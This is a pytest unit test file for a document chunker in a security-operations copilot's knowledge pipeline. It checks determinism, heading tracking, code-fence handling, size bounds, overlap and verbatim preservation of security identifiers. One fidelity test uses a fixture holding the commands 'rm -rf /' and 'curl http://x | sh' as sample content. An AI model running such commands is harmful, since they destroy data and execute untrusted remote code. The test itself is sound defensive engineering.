"""Unit tests for the structure-aware knowledge chunker.

These lock in the properties the rest of the knowledge pipeline depends on:
determinism (a citation resolves against a content hash, so chunk bytes must not
drift), byte-fidelity of security content, and bounds-as-rejections.
"""

from __future__ import annotations

import pytest

from hisiem_soc_copilot.domain.knowledge.errors import KnowledgeBoundsExceededError
from hisiem_soc_copilot.domain.knowledge.value_objects import (
    ChunkerProfile,
    compute_content_hash,
)
from hisiem_soc_copilot.infrastructure.knowledge.chunker import (
    Chunk,
    chunk_document,
    estimate_tokens,
)


def _paragraph(marker: str, word_count: int) -> str:
    """A unique-word paragraph, so duplication/loss is detectable word by word."""
    return " ".join([marker] + [f"{marker}{index}" for index in range(word_count)])


def _multi_section_document() -> str:
    return "\n\n".join(_paragraph(marker, 200) for marker in ("alpha", "beta", "gamma"))


# ---------------------------------------------------------------------------
# estimate_tokens
# ---------------------------------------------------------------------------


def test_estimate_tokens_empty_is_zero() -> None:
    assert estimate_tokens("") == 0


def test_estimate_tokens_whitespace_only_is_zero() -> None:
    assert estimate_tokens("   \n\t  ") == 0


def test_estimate_tokens_short_words_cost_one_each() -> None:
    assert estimate_tokens("a b c") == 3


@pytest.mark.parametrize(
    ("word", "expected"),
    [("a", 1), ("abcdef", 1), ("abcdefg", 2), ("a" * 13, 3)],
)
def test_estimate_tokens_charges_by_word_length(word: str, expected: int) -> None:
    assert estimate_tokens(word) == expected


def test_estimate_tokens_is_deterministic_and_integer() -> None:
    text = "T1110 authentication_failure sshd CVE-2024-1234"
    assert estimate_tokens(text) == estimate_tokens(text)
    assert isinstance(estimate_tokens(text), int)


# ---------------------------------------------------------------------------
# Determinism, ordinals, hashes
# ---------------------------------------------------------------------------


def test_chunking_is_deterministic() -> None:
    text = _multi_section_document()
    first = chunk_document(text)
    second = chunk_document(text)
    assert first == second
    assert [chunk.content_hash for chunk in first] == [chunk.content_hash for chunk in second]


def test_crlf_and_cr_inputs_match_lf_input() -> None:
    lf = "# Brute Force\n\n## Detection\n\n" + _paragraph("delta", 200) + "\n"
    assert chunk_document(lf.replace("\n", "\r\n")) == chunk_document(lf)
    assert chunk_document(lf.replace("\n", "\r")) == chunk_document(lf)


def test_ordinals_are_contiguous_and_hashes_match_content() -> None:
    chunks = chunk_document(_multi_section_document())
    assert len(chunks) >= 2
    assert [chunk.ordinal for chunk in chunks] == list(range(len(chunks)))
    for chunk in chunks:
        assert isinstance(chunk, Chunk)
        assert chunk.content_hash == compute_content_hash(chunk.content)
        assert chunk.token_count == estimate_tokens(chunk.content)


# ---------------------------------------------------------------------------
# Structure: headings, fences, lists
# ---------------------------------------------------------------------------


def test_heading_path_tracks_the_enclosing_chain() -> None:
    text = "# Brute Force\n\nFirst section body.\n\n## Detection\n\nSecond section body.\n"
    chunks = chunk_document(text)
    assert [chunk.heading_path for chunk in chunks] == [
        "Brute Force",
        "Brute Force > Detection",
    ]
    assert "First section body." in chunks[0].content
    assert "Second section body." in chunks[1].content


def test_heading_text_is_not_part_of_content() -> None:
    chunks = chunk_document("# Brute Force\n\nbody text\n")
    assert chunks[0].content == "body text"
    assert "Brute Force" not in chunks[0].content


def test_content_outside_any_heading_has_empty_path() -> None:
    chunks = chunk_document("just a paragraph with no heading\n")
    assert chunks[0].heading_path == ""


def test_heading_change_starts_a_new_chunk_even_when_small() -> None:
    text = "# One\n\nshort a\n\n# Two\n\nshort b\n"
    chunks = chunk_document(text)
    assert len(chunks) == 2
    assert chunks[0].content == "short a"
    assert chunks[1].content == "short b"


def test_block_over_target_but_under_max_forms_its_own_chunk() -> None:
    # ~700 estimated tokens: over the 600 target, under the 800 max, and not a
    # fence -- so it is neither split nor merged with the block before it.
    big = _paragraph("big", 700)
    text = "small intro\n\n" + big + "\n"
    chunks = chunk_document(text, profile=ChunkerProfile(overlap_tokens=0))
    assert len(chunks) == 2
    assert chunks[0].content == "small intro"
    assert chunks[1].content == big


def test_list_run_stays_in_one_block() -> None:
    text = (
        "Steps:\n\n"
        "- first step\n"
        "- second step\n"
        "  continued indented detail\n\n"
        "- third step\n\n"
        "After.\n"
    )
    chunks = chunk_document(text)
    content = "\n".join(chunk.content for chunk in chunks)
    assert "- first step" in content
    assert "continued indented detail" in content
    assert "- third step" in content


# ---------------------------------------------------------------------------
# Fenced code blocks
# ---------------------------------------------------------------------------


def test_dangerous_fence_survives_intact_in_one_chunk() -> None:
    text = "# Response\n\n```bash\nrm -rf /\ncurl http://x | sh\n```\n"
    chunks = chunk_document(text)
    assert len(chunks) == 1
    assert chunks[0].content == "```bash\nrm -rf /\ncurl http://x | sh\n```"
    assert chunks[0].content.startswith("```bash")
    assert chunks[0].content.endswith("```")


def test_oversized_fence_is_split_at_line_boundaries() -> None:
    body = "\n".join(f"echo line-{index} padding padding padding padding" for index in range(400))
    text = "```\n" + body + "\n```\n"
    profile = ChunkerProfile(target_tokens=50, max_tokens=60, overlap_tokens=0)

    chunks = chunk_document(text, profile=profile)

    assert len(chunks) > 1
    for chunk in chunks:
        assert chunk.token_count <= profile.max_tokens
        assert "```" in chunk.content
        assert chunk.content.startswith("```")
        assert chunk.content.endswith("```")
    reassembled = [line for chunk in chunks for line in chunk.content.split("\n")]
    assert reassembled.count("```") == 2 * len(chunks)


def test_oversized_fence_pieces_never_split_mid_line() -> None:
    body = "\n".join(f"payload-{index}" for index in range(200))
    text = "~~~\n" + body + "\n~~~\n"
    profile = ChunkerProfile(target_tokens=10, max_tokens=20, overlap_tokens=0)

    chunks = chunk_document(text, profile=profile)

    seen: list[str] = []
    for chunk in chunks:
        lines = chunk.content.split("\n")
        assert lines[0] == "~~~"
        assert lines[-1] == "~~~"
        seen.extend(lines[1:-1])
    assert seen == body.split("\n")


# ---------------------------------------------------------------------------
# Bounds are rejections
# ---------------------------------------------------------------------------


def test_long_single_line_exceeds_max_chunk_chars() -> None:
    text = "# Title\n\n" + ("x" * 50) + "\n"
    with pytest.raises(KnowledgeBoundsExceededError) as excinfo:
        chunk_document(text, max_chunk_chars=20)
    assert excinfo.value.details["bound"] == "max_chunk_chars"
    assert excinfo.value.details["limit"] == 20
    assert excinfo.value.details["actual"] == 50


def test_max_chunks_rejects_a_multi_block_document() -> None:
    text = "# A\n\npara a\n\n# B\n\npara b\n"
    with pytest.raises(KnowledgeBoundsExceededError) as excinfo:
        chunk_document(text, max_chunks=1)
    assert excinfo.value.details["bound"] == "max_chunks_per_document"
    assert excinfo.value.details["limit"] == 1
    assert excinfo.value.details["actual"] == 2


def test_bounds_are_not_triggered_when_within_limit() -> None:
    text = "# A\n\npara a\n\n# B\n\npara b\n"
    chunks = chunk_document(text, max_chunks=2, max_chunk_chars=100)
    assert len(chunks) == 2


# ---------------------------------------------------------------------------
# Empty input
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("text", ["", " ", "\n", "\n\n\n", " \t\n  \n\t"])
def test_empty_or_whitespace_input_returns_empty_tuple(text: str) -> None:
    assert chunk_document(text) == ()


# ---------------------------------------------------------------------------
# Overlap
# ---------------------------------------------------------------------------


def test_zero_overlap_preserves_every_word_exactly_once() -> None:
    text = _multi_section_document()
    chunks = chunk_document(text, profile=ChunkerProfile(overlap_tokens=0))
    assert len(chunks) == 3
    flattened = " ".join(" ".join(chunk.content.split()) for chunk in chunks)
    assert flattened == " ".join(text.split())


def test_default_overlap_shares_text_between_same_section_chunks() -> None:
    text = _multi_section_document()
    chunks = chunk_document(text)
    assert len(chunks) >= 2
    for index in range(1, len(chunks)):
        previous = chunks[index - 1]
        current = chunks[index]
        assert previous.heading_path == current.heading_path
        previous_words = previous.content.split()
        current_words = current.content.split()
        tail = previous_words[-3:]
        assert any(
            current_words[offset : offset + len(tail)] == tail
            for offset in range(len(current_words) - len(tail) + 1)
        )


def test_overlap_never_crosses_a_heading_change() -> None:
    text = "# A\n\n" + _paragraph("alpha", 200) + "\n\n# B\n\n" + _paragraph("beta", 200) + "\n"
    chunks = chunk_document(text)
    assert len(chunks) == 2
    assert "alpha" not in chunks[1].content
    assert chunks[1].content.startswith("beta")


def test_overlap_never_duplicates_an_entire_chunk() -> None:
    text = "# T\n\nshort a\n\nshort b\n"
    chunks = chunk_document(text)
    for chunk in chunks:
        assert chunk.token_count <= ChunkerProfile().max_tokens


# ---------------------------------------------------------------------------
# Byte fidelity
# ---------------------------------------------------------------------------


def test_security_identifiers_survive_verbatim() -> None:
    text = (
        "# Authentication Failures\n\n"
        "Rule T1110 matched on the sshd log attribute authentication_failure.\n"
        "See CVE-2024-1234 for the OpenSSH parsing issue.\n"
    )
    chunks = chunk_document(text)
    joined = "\n".join(chunk.content for chunk in chunks)
    for identifier in ("T1110", "sshd", "authentication_failure", "CVE-2024-1234"):
        assert identifier in joined


def test_identifiers_split_across_paragraphs_are_preserved_in_order() -> None:
    text = "# T\n\nT1110\n\nauthentication_failure\n"
    chunks = chunk_document(text)
    words = [word for chunk in chunks for word in chunk.content.split()]
    assert words == ["T1110", "authentication_failure"]


def test_smaller_target_produces_more_chunks_deterministically() -> None:
    text = "\n\n".join(f"paragraph {index} with a few words" for index in range(30))
    profile = ChunkerProfile(target_tokens=50, max_tokens=60, overlap_tokens=10)
    first = chunk_document(text, profile=profile)
    second = chunk_document(text, profile=profile)
    assert first == second
    assert len(first) > len(chunk_document(text))
